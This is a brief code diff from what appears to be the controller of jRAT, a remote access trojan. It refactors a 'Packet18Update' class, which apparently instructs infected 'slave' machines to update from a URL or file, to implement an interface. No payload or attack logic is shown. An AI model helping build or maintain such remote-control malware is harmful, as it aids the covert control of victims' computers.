@@ -4,7 +4,7 @@ import jrat.controller.Slave;
 
 import java.io.File;
 
-public class Packet18Update extends AbstractOutgoingPacket {
+public class Packet18Update implements OutgoingPacket {
 
 	private String url;
 	private boolean local;
